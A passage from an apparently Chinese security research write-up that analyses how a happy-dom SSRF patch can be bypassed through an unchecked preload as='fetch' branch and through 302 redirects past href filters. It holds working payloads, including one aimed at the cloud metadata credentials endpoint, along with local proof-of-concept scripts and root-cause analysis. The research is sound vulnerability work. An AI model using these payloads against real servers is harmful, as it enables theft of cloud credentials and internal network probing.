colspan=\"1\" rowspan=\"1\"><p>判定</p></th></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>基线</p></td><td colspan=\"1\" rowspan=\"1\"><p>补丁对被报告的两条路径有效</p></td><td colspan=\"1\" rowspan=\"1\"><p>iframe + stylesheet</p></td><td colspan=\"1\" rowspan=\"1\"><p>命中数 2 → 0</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>方向一</p></td><td colspan=\"1\" rowspan=\"1\"><p>补丁没盖全加载出口</p></td><td colspan=\"1\" rowspan=\"1\"><p><code>preload as=\"fetch\"</code> + 绝对 URL</p></td><td colspan=\"1\" rowspan=\"1\"><p>对照组 0 命中，向量命中</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>方向二</p></td><td colspan=\"1\" rowspan=\"1\"><p>应用层 href 过滤看不到最终目标</p></td><td colspan=\"1\" rowspan=\"1\"><p>同源相对路径 + 302</p></td><td colspan=\"1\" rowspan=\"1\"><p>A 端完整 GET，B 端收到 <code>OPTIONS</code></p></td></tr></tbody></table><h4 id=\"sec-73\">6.2.3 判定规则</h4><p>判定按下面六条：</p><ol><li><p>构造 <code>Window</code> 不传 <code>settings</code>，并打印实际生效的开关值：结论要落在默认配置上。</p></li><li><p>每个向量单开一个 <code>Window</code>，不复用页面：preload 缓存、连接池和上一轮的状态都会串进来。</p></li><li><p>必须有对照组，且对照组一条都不命中；命中说明环境或设置不对，这轮结果作废。</p></li><li><p>以对端服务的请求日志为准，记方法和路径。判断出没出网看日志，不看客户端有没有报错。</p></li><li><p>读日志前等 1.2–1.5 秒。Fetch 是异步的，读早了会把\"还没到\"当成\"被拦\"。</p></li><li><p>由脚本断言并返回退出码，<code>0</code> 才算通过：避免肉眼漏看，也方便接 CI。</p></li></ol><p>这六条和第三章\"证据分三层\"的思路是同一套：不依赖单一信号，先证明出口开着，再证明某条路径没被拦住。</p><h3 id=\"sec-74\">6.3 方向一：<code>&lt;link rel=\"preload\" as=\"fetch\"&gt;</code></h3><p>补丁在 <code>#preloadResource</code> 的 <code>style</code> 分支和 iframe 加载点各加了一道检查。同一个函数里除 <code>style</code>、<code>script</code> 外是否还有第三个分支、它是否受检查，决定了补丁覆盖是否完整。</p><p>问题不在\"又发现一个新漏洞\"，而在<strong>覆盖</strong>：若修复模型是\"在每个已知出口前加检查\"，安全性就取决于出口枚举的完备性，漏掉一个，性质即不成立。</p><h4 id=\"sec-75\">6.3.1 代码路径</h4><p><code>#preloadResource</code> 先过滤 <code>as</code>，再按分支决定是否继续。v21.0.4 的实现（节选，注释为本文所加）：</p><pre><code>// lib/nodes/html-link-element/HTMLLinkElement.js:294-346\nasync #preloadResource(url: string): Promise&lt;void&gt; {\n    const window = this[PropertySymbol.window];\n    const browserFrame = new WindowBrowserContext(window).getBrowserFrame();\n    const as = this.as;\n\n    // 支持列表：只有 \"script\"、\"style\" 和 \"fetch\"\n    if (\n        !browserFrame ||\n        !this[PropertySymbol.isConnected] ||\n        (as !== 'script' &amp;&amp; as !== 'style' &amp;&amp; as !== 'fetch')\n    ) {\n        return;\n    }\n\n    const browserSettings = browserFrame.page.context.browser.settings;\n\n    // 检查 1：script（补丁之前就有）\n    if (as === 'script' &amp;&amp;\n        (browserSettings.disableJavaScriptFileLoading || !browserSettings.enableJavaScriptEvaluation)) {\n        return;\n    }\n\n    // 检查 2：style（补丁新增）\n    if (as === 'style' &amp;&amp;\n        (browserSettings.disableCSSFileLoading || !browserSettings.enableCSSFileLoading)) {\n        return;\n    }\n\n    // ← as === 'fetch' 不进入检查，直接落到这里\n    const absoluteURL = new URL(url, window.location.href).href;\n    const fetch = new Fetch({\n        browserFrame,\n        window,\n        url: absoluteURL,\n        disableSameOriginPolicy: as === 'script' || as === 'style', // fetch: false\n        disablePreload: true,\n        init: { credentials: this.crossOrigin === 'use-credentials' ? 'include' : 'same-origin' }\n    });\n\n    const response = await fetch.send(); // ← 出网（响应处理略）\n}\n</code></pre><p>支持列表只有 <code>script</code>、<code>style</code>、<code>fetch</code>；前两个各有一道检查，<code>fetch</code> 通过白名单后直接落到 <code>new Fetch({...}).send()</code>，没有任何 <code>browserSettings</code> 检查。<code>as=\"font\"</code> 之类的值在第一个 <code>if</code> 就返回，走不到检查分支。</p><p>补丁对这个函数的改动只落在 <code>style</code> 分支上。<code>fetch</code> 分支在 v20.14.6 就能出网，并非补丁引入；补丁关掉相邻两个分支后，它成了默认配置下唯一没有检查的声明式出口。</p><p>注意这里和 4.6.2 的对照关系：原 CVE 的 style 路径走的是 <code>#loadStyleSheet</code>，补丁在那里加了 <code>enableCSSFileLoading</code>；而 <code>rel=\"preload\"</code> 走的是同类的另一个函数 <code>#preloadResource</code>，补丁只在它的 <code>style</code> 分支上加了检查。一个元素、两个加载函数、三个分支，覆盖差异就出在这里。</p><h4 id=\"sec-76\">6.3.2 载荷</h4><pre><code>&lt;link rel=\"preload\" as=\"fetch\" href=\"http://169.254.169.254/latest/meta-data/iam/security-credentials/\"&gt;\n</code></pre><p>注入前提与原 CVE 相同：应用把攻击者可控的 HTML 交给 happy-dom 在服务端解析（<code>document.write</code>、<code>window.loadHTML</code>、DOMParser 后挂载等）。</p><h4 id=\"sec-77\">6.3.3 本地复现</h4><pre><code>mkdir -p scheme1 &amp;&amp; cd scheme1\nnpm init -y &gt;/dev/null\nnpm install happy-dom@21.0.4\n# 保存下面的脚本为 scheme1-verify.mjs\nnode scheme1-verify.mjs; echo \"exit=$?\"\n</code></pre><pre><code>// scheme1-verify.mjs —— 默认设置下，5 个控制组 + 1 个向量\nimport http from 'node:http';\nimport { Window } from 'happy-dom';\n\nconst PORT = 30091, BASE = `http://127.0.0.1:${PORT}`;\nconst hits = [];\nconst server = http.createServer((req, res) =&gt; {\n    if (req.url === '/report') { res.writeHead(200); return res.end(JSON.stringify(hits)); }\n    hits.push(req.url);\n    res.writeHead(200, { 'Content-Type': 'text/plain' });\n    res.end(req.url.startsWith('/metadata') ? 'SECRET-ROLE: admin' : 'ok');\n});\nawait new Promise((r) =&gt; server.listen(PORT, '127.0.0.1', r));\n\n// 证明：构造 Window 时没有传 settings\nconst s = new Window({ url: BASE + '/' }).happyDOM.settings;\nconsole.log('runtime settings:', JSON.stringify({\n    enableCSSFileLoading: s.enableCSSFileLoading,\n    enableIframePageLoading: s.enableIframePageLoading,\n    enableImageFileLoading: s.enableImageFileLoading,\n    enableJavaScriptEvaluation: s.enableJavaScriptEvaluation\n}));\n\nconst rounds = [\n    ['control stylesheet', `&lt;link rel=\"stylesheet\" href=\"${BASE}/metadata?vec=ctrl-stylesheet\"&gt;`, false],\n    ['control iframe', `&lt;iframe src=\"${BASE}/metadata?vec=ctrl-iframe\"&gt;&lt;/iframe&gt;`, false],\n    ['control script', `&lt;script src=\"${BASE}/metadata?vec=ctrl-script\"&gt;&lt;/script&gt;`, false],\n    ['control img', `&lt;img src=\"${BASE}/metadata?vec=ctrl-img\"&gt;`, false],\n    ['control as=font', `&lt;link rel=\"preload\" as=\"font\" href=\"${BASE}/metadata?vec=ctrl-font\"&gt;`, false],\n    ['VECTOR as=fetch', `&lt;link rel=\"preload\" as=\"fetch\" href=\"${BASE}/metadata?vec=vector\"&gt;`, true]\n];\n\nfor (const [, html] of rounds) {\n    const w = new Window({ url: BASE + '/' }); // 关键：不传 settings\n    w.document.write(html);\n    await new Promise((r) =&gt; setTimeout(r, 1200));\n    w.close();\n}\n\nconst report = await (await fetch(`${BASE}/report`)).json();\nconsole.log('hit log:', report.join(', ') || '(empty)');\nlet failed = false;\nfor (const [name, html, expectHit] of rounds) {\n    const vec = html.match(/vec=([\\w-]+)/)[1];\n    const hit = report.some((u) =&gt; u.includes('vec=' + vec));\n    if (hit !== expectHit) failed = true;\n    console.log(`  [${hit === expectHit ? 'PASS' : 'FAIL'}] ${name.padEnd(20)} ${hit ? 'REACHED' : 'blocked'}`);\n}\nconsole.log(failed ? 'RESULT: FAILED' : 'RESULT: BYPASS CONFIRMED');\nserver.close();\nprocess.exit(failed ? 1 : 0);\n</code></pre><p>前四个控制组对应补丁关闭或本来就关闭的加载路径，<code>as=\"font\"</code> 对应白名单拒绝；只有 <code>as=\"fetch\"</code> 预期命中。</p><h4 id=\"sec-78\">6.3.4 结果</h4><pre><code>runtime settings: {\"enableCSSFileLoading\":false,\"enableIframePageLoading\":false,\"enableImageFileLoading\":false,\"enableJavaScriptEvaluation\":false}\nhit log: /metadata?vec=vector\n  [PASS] control stylesheet   blocked\n  [PASS] control iframe       blocked\n  [PASS] control script       blocked\n  [PASS] control img          blocked\n  [PASS] control as=font      blocked\n  [PASS] VECTOR as=fetch      REACHED\nRESULT: BYPASS CONFIRMED\n</code></pre><p>退出码 <code>0</code>。</p><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261112123633-a31c5684-de52-1.png&amp;mode=full&amp;exp=1794787200&amp;sig=0ed7bdc425f2cff1\" loading=\"lazy\" decoding=\"async\" title=\"null\"></p><p><em>图 6-1　6.3.4 默认设置下的判定：5 个控制组被拦，</em><code>preload as=\"fetch\"</code>_ 命中（图片：06-bypass1-05-默认设置下触发绕过-01.png）_</p><h4 id=\"sec-79\">6.3.5 边界条件：CORS 决定这条路径能走多远</h4><p>这条路径受 CORS 约束，能否实际发出请求取决于基址与目标的关系。基址对照（同一台机器，两个端口区分 origin）：</p><table><tbody><tr><th colspan=\"1\" rowspan=\"1\"><p>解析上下文基址</p></th><th colspan=\"1\" rowspan=\"1\"><p>载荷</p></th><th colspan=\"1\" rowspan=\"1\"><p>观测</p></th></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>与目标同源</p></td><td colspan=\"1\" rowspan=\"1\"><p><code>&lt;link rel=\"preload\" as=\"fetch\" href=\"目标\"&gt;</code></p></td><td colspan=\"1\" rowspan=\"1\"><p><code>GET</code> 到达</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>与目标跨源，默认属性</p></td><td colspan=\"1\" rowspan=\"1\"><p>同上</p></td><td colspan=\"1\" rowspan=\"1\"><p><strong>无任何网络包</strong></p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>与目标跨源，<code>crossorigin=\"use-credentials\"</code></p></td><td colspan=\"1\" rowspan=\"1\"><p>同上</p></td><td colspan=\"1\" rowspan=\"1\"><p><code>OPTIONS</code> 到达；目标回 <code>Access-Control-Allow-Origin</code> 时 <code>GET</code> 也到达</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p><code>about:blank</code></p></td><td colspan=\"1\" rowspan=\"1\"><p>同上</p></td><td colspan=\"1\" rowspan=\"1\"><p>无包</p></td></tr></tbody></table><p>复跑方式：脚本本身是同源形态；另起一个回环端口作目标即跨源；加 <code>crossorigin=\"use-credentials\"</code> 即第三种；<code>about:blank</code> 直接作为 <code>url</code>。</p><p>跨源、默认属性时一个包都发不出，原因是预检与主请求互相等待，这本身是一个独立缺陷：</p><ol><li><p>主请求在 <code>HTMLLinkElement</code> 里先注册一个 preload entry，key 是 <code>{ url, destination: 'fetch', mode: 'cors', credentialsMode: 'same-origin' }</code>；</p></li><li><p>然后用 <code>disablePreload: true</code> 建 <code>Fetch</code>，跳过自己的缓存查找，进入 <code>Fetch.send()</code>；</p></li><li><p>页面基址与目标跨源，<code>Fetch.send()</code> 进入 CORS 预检，另建一个 <code>Fetch</code> 发 <code>OPTIONS</code>；</p></li><li><p>这个预检 <code>Fetch</code> 没有设 <code>disablePreload</code>，在默认属性下，它用同一个 URL / destination / mode / credentials 计算 preload key，命中了主请求自己注册的 entry；</p></li><li><p>预检执行 <code>await preloadEntry.onResponseAvailable()</code>，等待主请求完成；而主请求正在等待预检结果——<strong>互相等待，首包永远不发出</strong>。</p></li></ol><p><code>use-credentials</code> 之所以能打破等待，是因为 preload key 里包含 <code>credentialsMode</code>：主请求用 <code>include</code>，预检用默认的 <code>same-origin</code>，两者不再命中同一个 entry。</p><p>实测跨源 + <code>use-credentials</code>、目标回 <code>Access-Control-Allow-Origin: *</code> 时，目标端依次收到 <code>OPTIONS /metadata</code> 与 <code>GET /metadata</code>：</p><pre><code>target hits: OPTIONS /metadata, GET /metadata\n</code></pre><p>所以，这条路径的完整 <code>GET</code> 需要两个条件之一：<strong>基址与目标同源</strong>，或<strong>目标对 CORS 宽松</strong>。否则它最多是一次盲探测（<code>OPTIONS</code>），甚至完全静默。</p><p>这是 happy-dom 的 CORS 实现带来的限制，并不改变该分支没有检查这一事实：若页面基址就是目标（如按用户 URL 设置 <code>page.url</code> 的预览功能），它就是完整 GET；基址固定时，它仍是方向二的基础。</p><p>CORS 限制的是跨源读取，不是出网。只要预检能发出去，<code>OPTIONS</code> 本身就是一次出网；被拦住的是后续 <code>GET</code> 和响应体。目标没回 ACAO 只能说明读不到数据，不能说明没有 SSRF。</p><h4 id=\"sec-80\">6.3.6 为什么会漏掉这一支</h4><ul><li><p><strong>语义错位</strong>：<code>preload</code> 在浏览器里是\"提示\"，不是\"资源类型\"。修 CSS / iframe 的人会自然地把 <code>as=\"style\"</code> 和 <code>&lt;link rel=\"stylesheet\"&gt;</code> 放在一起看，而 <code>as=\"fetch\"</code> 更像 fetch API 的预热，不在\"外部资源加载\"的清单里。</p></li><li><p><strong>没有对应开关</strong>：补丁做的是\"翻转默认值\"，而 <code>as=\"fetch\"</code> 从来没有一个 <code>enableFetchPreloading</code> 之类的开关。没有开关，就不会出现在\"默认值清单\"里，也就不会被顺手翻转。</p></li><li><p><strong>白名单被误当成授权</strong>：<code>as</code> 列表回答的是\"这个值合不合法\"，不是\"这个值允不允许出网\"。<code>fetch</code> 合法，但它没有被授权。</p></li></ul><h3 id=\"sec-81\">6.4 方向二：302 重定向</h3><h4 id=\"sec-82\">6.4.1 威胁模型</h4><p>方向一假设使用方什么都没加。现实中更可能发生的是：使用方读了公告，在应用层补了一道 href 检查，只允许相对路径或同源 URL。</p><pre><code>// 应用层的\"安全 href 检查\"（示意）\nconst target = new URL(href, pageBase);\nif (target.origin !== pageBase.origin) {\n    throw new Error('blocked: cross-origin href');\n}\n</code></pre><p>这道检查能挡住方向一的绝对 URL 载荷。但它检查的是<strong>HTML 里的 </strong><code>href</code><strong> 字符串</strong>，不是 happy-dom 最终会请求的 URL。由此产生第二个方向的问题：</p><blockquote><p>如果过滤器只放行同源 / 相对路径，攻击者还能不能把请求送到内网？</p></blockquote><p>实验没有实现这个过滤器，而是用只含相对路径的载荷；这类载荷任何\"只允许相对 / 同源\"的过滤器都会放行。这里验证的是过滤思路的盲区，与具体实现无关。</p><h4 id=\"sec-83\">6.4.2 载荷</h4><pre><code>&lt;link rel=\"preload\" as=\"fetch\" href=\"/redirect-same\"&gt;   &lt;!-- A：302 -&gt; /metadata --&gt;\n&lt;link rel=\"preload\" as=\"fetch\" href=\"/redirect-cross\"&gt;  &lt;!-- B：302 -&gt; 另一台内网主机 --&gt;\n</code></pre><p><code>/redirect-*</code> 是应用域上任何会返回 302 的端点的替身：开放重定向、短链、登录回跳、<code>?next=</code> 参数。它们本身可能不是漏洞，但在服务端解析器里，它们是网络跳板。</p><p>过滤器视角完全无害；真实目标由 <code>Location</code> 决定。</p><h4 id=\"sec-84\">6.4.3 重定向处理</h4><p><code>Fetch</code> 对 3xx 的处理在 <code>handleRedirectResponse</code>：取 <code>Location</code>，做最大跳数检查，然后用 <code>redirectCount + 1</code> 新建一个 <code>Fetch</code> 并直接 <code>.send()</code>。</p><pre><code>// lib/fetch/Fetch.js:696-779（节选）\nhandleRedirectResponse(nodeResponse, responseHeaders) {\n    if (!isRedirect(nodeResponse.statusCode)) {\n        return false;\n    }\n    switch (this.request.redirect) {\n        case 'follow':\n            const locationHeader = responseHeaders.get('Location');\n            const locationURL = new URL(locationHeader, this.request.url);\n\n            if (isMaxRedirectsReached(this.redirectCount)) {\n                // 最多 20 跳\n                this.reject(new DOMException('Maximum redirects reached'));\n                return true;\n            }\n\n            const headers = new Headers(this.request.headers);\n            if (isCORS(this.request.url, locationURL)) {\n                headers.delete('authorization'); // 跨源只删认证头\n            }\n            // ... Cookie 按 credentials 规则删除 ...\n\n            const fetch = new Fetch({\n                browserFrame: this.#browserFrame,\n                window: this.#window,\n                url: locationURL,\n                init: requestInit,\n                redirectCount: this.redirectCount + 1,\n                disableSameOriginPolicy: this.disableSameOriginPolicy,\n                contentType: ...\n            });\n\n            this.finalizeRequest();\n            fetch.send().then((response) =&gt; this.resolve(response)).catch((error) =&gt; this.reject(error));\n            return true;\n    }\n}\n</code></pre><p>几个关键点：</p><ul><li><p>3xx 列表是 <code>301 / 302 / 303 / 307 / 308</code>，最多 20 跳；</p></li><li><p><code>Location</code> 相对<strong>当前请求 URL</strong> 解析，不是相对页面基址；</p></li><li><p>跨源重定向只删 <code>Authorization</code>；<code>Cookie</code> 按 credentials 规则删；</p></li><li><p><strong>全程没有\"最终目标是否属于私网\"的检查</strong>。</p></li></ul><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261112123633-a3a344d2-de52-1.png&amp;mode=full&amp;exp=1794787200&amp;sig=db72ed4ed81ad5ee\" loading=\"lazy\" decoding=\"async\" title=\"null\"></p><p><em>图 6-2　6.4.3 源码证据：</em><code>redirectCount + 1</code>_ 重建 <code>Fetch</code> 后直接 <code>send</code>，没有目标网段校验（图片：06-bypass2-13-源码证据-重定向无条件跟随-01.png）_</p><h4 id=\"sec-85\">6.4.4 实验拓扑</h4><p>本地用两个回环端口模拟两台主机（origin = scheme + host + port，端口不同即跨源）：</p><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261112123635-a4ba30df-de52-1.png&amp;mode=full&amp;exp=1794787200&amp;sig=ceb15b1d2c26c591\" loading=\"lazy\" decoding=\"async\" title=\"null\"></p><p><em>图 6-3　6.4.4 方案 2 的实验拓扑：A 完整 </em><code>GET</code><em>，B 以 </em><code>OPTIONS</code><em> 预检到达（图片：00-diagram-scheme2-redirect-302.jpg）</em></p><h4 id=\"sec-86\">6.4.5 本地复现</h4><pre><code>mkdir -p scheme2 &amp;&amp; cd scheme2\nnpm init -y &gt;/dev/null\nnpm install happy-dom@21.0.4\n# 保存下面的脚本为 scheme2-verify.mjs\nnode scheme2-verify.mjs; echo \"exit=$?\"\n</code></pre><pre><code>// scheme2-verify.mjs —— 同源 href + 302，检验应用层 href 过滤的盲区\nimport http from 'node:http';\nimport { Window } from 'happy-dom';\n\nconst INT = 'http://127.0.0.1:30091', INT2 = 'http://127.0.0.1:30092';\nconst log = [], log2 = [];\nconst internal = http.createServer((req, res) =&gt; {\n    const path = req.url.split('?')[0];\n    if (path === '/report') { res.writeHead(200); return res.end(JSON.stringify(log)); }\n    log.push(req.method + ' ' + req.url);\n    if (path === '/redirect-same') { res.writeHead(302, { Location: '/metadata?vec=same-hop2' }); return res.end(); }\n    if (path === '/redirect-cross') { res.writeHead(302, { Location: INT2 + '/metadata?vec=cross-hop2' }); return res.end(); }\n    res.writeHead(200, { 'Content-Type': 'text/plain' });\n    res.end(path.startsWith('/metadata') ? 'SECRET-ROLE: admin' : 'ok');\n});\nconst internal2 = http.createServer((req, res) =&gt; {\n    const path = req.url.split('?')[0];\n    if (path === '/report') { res.writeHead(200); return res.end(JSON.stringify(log2)); }\n    log2.push(req.method + ' ' + req.url);\n    res.writeHead(200, { 'Content-Type': 'text/plain' });\n    res.end('SECRET-ROLE: admin');\n});\nawait Promise.all([\n    new Promise((r) =&gt; internal.listen(30091, '127.0.0.1', r)),\n    new Promise((r) =&gt; internal2.listen(30092, '127.0.0.1', r))\n]);\n\n// 证明：构造 Window 时没有传 settings\nconst s = new Window({ url: INT + '/' }).happyDOM.settings;\nconsole.log('runtime settings:', JSON.stringify({\n    enableCSSFileLoading: s.enableCSSFileLoading,\n    enableIframePageLoading: s.enableIframePageLoading,\n    enableImageFileLoading: s.enableImageFileLoading,\n    enableJavaScriptEvaluation: s.enableJavaScriptEvaluation\n}));\n\nconst probe = async (html) =&gt; {\n    const w = new Window({ url: INT + '/' }); // 默认设置，页面基址 = 应用域\n    w.document.write(html);\n    await new Promise((r) =&gt; setTimeout(r, 1500));\n    w.close();\n};\n\n// 控制组：补丁路径仍然被拦；baseline：出口本身是开的\nawait probe(`&lt;link rel=\"stylesheet\" href=\"${INT}/metadata?vec=ctrl\"&gt;`);\nawait probe(`&lt;link rel=\"preload\" as=\"fetch\" href=\"${INT}/metadata?vec=baseline\"&gt;`);\n// 过滤器会放行的两个载荷：都是相对路径\nawait probe(`&lt;link rel=\"preload\" as=\"fetch\" href=\"/redirect-same\"&gt;`);\nawait probe(`&lt;link rel=\"preload\" as=\"fetch\" href=\"/redirect-cross\"&gt;`);\n\nconst r1 = await (await fetch(INT + '/report')).json();\nconst r2 = await (await fetch(INT2 + '/report')).json();\nconsole.log('internal :', r1.join(' | ') || '(empty)');\nconsole.log('internal2:', r2.join(' | ') || '(empty)');\n\nconst has = (arr, m, u) =&gt; arr.some((x) =&gt; x.startsWith(m) &amp;&amp; x.includes(u));\nconst checks = [\n    ['control stylesheet blocked', !r1.some((u) =&gt; u.includes('vec=ctrl'))],\n    ['baseline direct GET', has(r1, 'GET', 'vec=baseline')],\n    ['A first hop', has(r1, 'GET', '/redirect-same')],\n    ['A final GET (same-origin)', has(r1, 'GET', 'vec=same-hop2')],\n    ['B first hop', has(r1, 'GET', '/redirect-cross')],\n    ['B final reach internal2', has(r2, 'OPTIONS', 'vec=cross-hop2')]\n];\nlet failed = false;\nfor (const [name, ok] of checks) { if (!ok) failed = true; console.log(`  [${ok ? 'PASS' : 'FAIL'}] ${name}`); }\nconsole.log(failed ? 'RESULT: FAILED' : 'RESULT: BYPASS CONFIRMED (A full GET; B preflight only)');\ninternal.close(); internal2.close(); process.exit(failed ? 1 : 0);\n</code></pre><p><code>control stylesheet</code> 仍被拦、<code>baseline</code> 命中、A / B 成立，说明问题不在补丁未生效，而在覆盖不全。</p><h4 id=\"sec-87\">6.4.6 结果</h4><pre><code>runtime settings: {\"enableCSSFileLoading\":false,\"enableIframePageLoading\":false,\"enableImageFileLoading\":false,\"enableJavaScriptEvaluation\":false}\ninternal : GET /metadata?vec=baseline | GET /redirect-same | GET /metadata?vec=same-hop2 | GET /redirect-cross\ninternal2: OPTIONS /metadata?vec=cross-hop2\n  [PASS] control stylesheet blocked\n  [PASS] baseline direct GET\n  [PASS] A first hop\n  [PASS] A final GET (same-origin)\n  [PASS] B first hop\n  [PASS] B final reach internal2\nRESULT: BYPASS CONFIRMED (A full GET; B preflight only)\n</code></pre><p>退出码 <code>0</code>。</p><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261112123636-a558fd92-de52-1.png&amp;mode=full&amp;exp=1794787200&amp;sig=c38f3788934e462d\" loading=\"lazy\" decoding=\"async\" title=\"null\"></p><p><em>图 6-4　6.4.6 重定向链绕过的自动判定：6 项断言全过（图片：06-bypass2-10-重定向链绕过补丁-01.png）</em></p><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261112123637-a5dcd271-de52-1.png&amp;mode=full&amp;exp=1794787200&amp;sig=54fb60c7fdbf3ee1\" loading=\"lazy\" decoding=\"async\" title=\"null\"></p><p><em>图 6-5　6.4.6 内网两侧的命中日志：所有请求都来自 app 容器（图片：06-bypass2-11-内网命中日志证据-01.png）</em></p><h4 id=\"sec-88\">6.4.7 A 与 B 的差异</h4><p>A 形态的最终目标与页面同源，不触发 CORS，所以完整 <code>GET</code> 到达应用域上的敏感路径。这里的\"完整\"指<strong>请求侧</strong>：happy-dom 确实把响应读进了进程；响应体不会自动回到攻击者。默认配置下更准确的定性是<strong>盲 SSRF + 完整 GET 能力</strong>；如果应用把 preload 结果、错误或时序暴露出来，才可能进一步变成可读外泄。</p><p>B 形态的最终目标跨源，happy-dom 会先做 CORS 预检；与浏览器不同，它对 simple GET 也预检。<code>OPTIONS</code> 到达 <code>internal2</code>；主 <code>GET</code> 等 <code>Access-Control-Allow-Origin</code>，目标刻意不回，于是被拦。</p><p>如果目标是内部对象存储、CDN 或某些内部 API——它们经常回 <code>Access-Control-Allow-Origin: *</code>——主 <code>GET</code> 就会继续。happy-dom 的预检校验接受 <code>*</code>，也接受与页面 origin 相同的值。</p><p>这一点可以直接验证：把 <code>internal2</code> 的响应头改成 <code>Access-Control-Allow-Origin: *</code>，其余不变，再跑一次，命中日志就变成：</p><pre><code>internal2: OPTIONS /metadata?vec=cross-hop2 | GET /metadata?vec=cross-hop2\n</code></pre><p>B 形态的完整 GET 只差目标的一个响应头；<code>OPTIONS</code> 能到，说明网络可达性已经暴露。</p><p>还有一个容易忽略的细节：方向一里\"跨源默认属性 → 无包\"的死锁，在方向二里没有出现。preload entry 的 key 基于<strong>首跳 URL</strong>（<code>/redirect-cross</code>）注册，而预检针对的是<strong>重定向后的 URL</strong>（<code>internal2/metadata</code>），两个 key 不同，预检不会撞上主请求的 entry。</p><h3 id=\"sec-89\">6.5 根因：三个视角看同一处缺失</h3><h4 id=\"sec-90\">6.5.1 出口级检查的覆盖率问题</h4><p>补丁的修复模型是 sink-level gate：每个加载点在发请求前查自己的开关。它在补丁覆盖的路径上是对的，但它把\"默认不出网\"变成了一个<strong>覆盖率问题</strong>：</p><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261112123639-a72bb088-de52-1.png&amp;mode=full&amp;exp=1794787200&amp;sig=2c5f470210a54e94\" loading=\"lazy\" decoding=\"async\" title=\"null\"></p><p><em>图 6-6　6.5.1 两种出网检查模型对比：sink 级闸门 vs 统一 chokepoint（图片：00-diagram-fetch-sink-gate-vs-chokepoint.jpg）</em></p><p>\"默认不出网\"是一个全称命题：<strong>所有走 Fetch 的 sink</strong> 都不出网。只要有一个 sink 不查开关，命题就假。</p><p>sink 还会增长。今天枚举完了，明天加一个 <code>&lt;link rel=\"prefetch\"&gt;</code> 或新的资源类型，只要开发者不记得加检查，就又多一个缺口。按出口设的检查，安全性依赖枚举的完备性；而枚举一定会漏。</p><p>如果把检查放在 <code>Fetch.send()</code> 这个 chokepoint 上，走 Fetch 的新 sink 会自动受约束；漏掉的分支最多表现为功能不可用，而不会让安全性质失效。（<code>WebSocket</code> 不走 Fetch，需要单独的策略点，这是另一个话题。）</p><h4 id=\"sec-91\">6.5.2 校验与授权混在一起</h4><p>代码先做了一次\"值是否合法\"的判断，再做\"这个值是否被允许\"的判断。前者是输入校验，后者是授权。<code>fetch</code> 通过了前者，却没有进入后者的任何分支。</p><p>这是典型的 <strong>validate then forget authorization</strong>。更安全的写法是把支持列表和检查绑定：对每个支持的 <code>as</code> 都有一个明确的 allow / deny，或者默认拒绝，只有显式允许的分支才继续。</p><h4 id=\"sec-92\">6.5.3 验证点与执行点分离</h4><p>应用层过滤器在 HTML 层工作，它看到的是字符串；happy-dom 在网络层工作，它看到的是 URL 解析和重定向后的结果。两者之间隔着一个 302。</p><pre><code>过滤器看到的：   /redirect-same                     （相对路径，同源，放行）\n网络实际请求的： http://internal:8080/metadata?vec=same-hop2\n</code></pre><p>这与传统 TOCTOU（时间差）不同，问题出在表示层面：验证的对象和执行的对象不是同一个。任何\"只看 href\"的过滤器都不完整，除非它自己解析并跟随重定向，或者把校验下沉到实际发请求的那一层。</p><p>同源 href 的\"安全性\"也不稳定：今天 <code>/redirect</code> 指向 <code>/home</code>，明天可能因开放重定向、短链或运营配置指向别处。过滤器验证的是会变的映射，不是最终目标。</p><h4 id=\"sec-93\">6.5.4 权限继承</h4><p>重定向不是\"再发一个请求\"那么简单，它继承了原请求的权限：<code>headers</code>、<code>credentials</code>、<code>referrer</code>、<code>disableSameOriginPolicy</code>。同源重定向保留 <code>Cookie</code> / <code>Authorization</code>；跨源重定向删认证头，但请求仍然发出。</p><p>在浏览器里，这通常受用户网络位置限制；在服务端解析器里，请求的起点是应用进程，终点可能是内网。302 因此从\"跳转\"变成了\"权限转移\"。开放重定向也不只是钓鱼问题，它在 SSR / SSRF 语境下是网络跳板。</p><h4 id=\"sec-94\">6.5.5 共同缺失</h4><p>方向一检验库的覆盖率，方向二检验使用方的过滤层；两者共用一个出口，也都指向同一个缺失：<strong>一个统一的、默认拒绝的出网策略点</strong>。这个点不存在，补一个分支、加一道 href 检查，都只是把攻击面挪到下一个未检查的位置。</p><h3 id=\"sec-95\">6.6 本章结论</h3><ol><li><p><strong>方向一（库内）：</strong><code>as=\"fetch\"</code>** 是默认配置下唯一没有检查的声明式出口。** 运行期开关全为 <code>false</code> 时，stylesheet / iframe / script / img / <code>as=\"font\"</code> 五个控制组全部被拦，只有 <code>&lt;link rel=\"preload\" as=\"fetch\"&gt;</code> 命中，<code>exit=0</code>。这条路径的覆盖范围由 CORS 决定：基址与目标同源时是完整 <code>GET</code>；跨源默认属性下，预检与主请求的 preload entry 互相等待，一个包都发不出；加 <code>crossorigin=\"use-credentials\"</code> 至少能发出 <code>OPTIONS</code>，目标回 ACAO 时 <code>GET</code> 也会继续。</p></li><li><p><strong>方向二（库外）：应用层 href 过滤不是边界。</strong> 两个只含相对路径的载荷都能通过\"只允许相对 / 同源\"的过滤器：A 经 302 回到同源敏感路径，得到完整 <code>GET</code>；B 经 302 跳到另一个 origin，至少以 <code>OPTIONS</code> 预检到达，目标回 <code>Access-Control-Allow-Origin: *</code> 时 <code>GET</code> 也继续。默认配置下响应不回显，定性仍是盲 SSRF + 完整 GET 能力。</p></li></ol><hr><h2 